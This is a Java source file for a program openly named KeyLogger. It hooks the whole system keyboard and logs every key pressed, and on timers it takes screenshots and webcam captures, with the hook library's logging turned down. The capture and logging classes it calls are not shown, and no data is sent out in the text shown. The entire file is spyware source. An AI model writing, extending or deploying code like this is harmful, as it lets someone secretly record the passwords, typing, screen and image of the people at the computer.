package org.apollyon;

import org.apollyon.capture.WebcamCapture;
import org.apollyon.capture.CaptureInterface;
import org.apollyon.capture.Logging;
import org.apollyon.capture.ScreenshotCapture;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class KeyLogger implements NativeKeyListener {

    private static final Logger logger = LoggerFactory.getLogger(KeyLogger.class);

    private final ScheduledExecutorService executorService = Executors.newScheduledThreadPool(1);

    private final ScreenshotCapture screenshotService;

    private final Logging logging;

    private final CaptureInterface webcamService;

    public KeyLogger(ScreenshotCapture screenshotService, Logging logging, CaptureInterface webcamService) {
        this.screenshotService = screenshotService;
        this.logging = logging;
        this.webcamService = webcamService;
    }

    public void start() {
        logger.info("Key logger has been started");

        init();

        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            logger.error(e.getMessage(), e);
            System.exit(-1);
        }
        GlobalScreen.addNativeKeyListener(this);
        executorService.scheduleAtFixedRate(screenshotService::capture, 0, ScreenshotCapture.SCREENSHOT_INTERVAL_MS, TimeUnit.MILLISECONDS);
        executorService.scheduleAtFixedRate(webcamService::capture, 0, WebcamCapture.WEBCAM_INTERVAL_MS, TimeUnit.MILLISECONDS);
    }

    private static void init() {
        java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(java.util.logging.Level.WARNING);
        logger.setUseParentHandlers(false);
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        logging.logKeyPressed(e.getKeyCode());
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
    }

    public static void main(String[] args) {
        var screenshotService = new ScreenshotCapture();
        var webcamService1 = new WebcamCapture();
        var loggingService = new Logging();

        KeyLogger keyLogger = new KeyLogger(screenshotService, loggingService, webcamService1);
        keyLogger.start();
    }
}